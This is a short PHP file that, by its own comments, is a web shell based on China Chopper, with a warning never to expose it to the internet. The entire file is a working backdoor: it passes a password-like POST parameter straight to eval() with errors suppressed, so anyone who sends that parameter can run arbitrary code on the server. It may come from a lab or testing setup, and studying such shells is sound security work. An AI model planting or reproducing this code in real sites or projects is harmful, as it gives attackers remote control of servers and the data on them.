<!-- THIS IS AN EXPLOTABLE WEB SHELL, NEVER EXPOSE TO THE INTERNET -->
<!-- Modified to prevent constant reboots, ask Dave for instructions -->
<?php
// Based on the China Chopper web shell
try{
    @eval($_POST['NEXUSANARCHY2337']);
} catch (Throwable $t) {
    $_POST['NEXUSANARCHY2337'] = null;
}
?>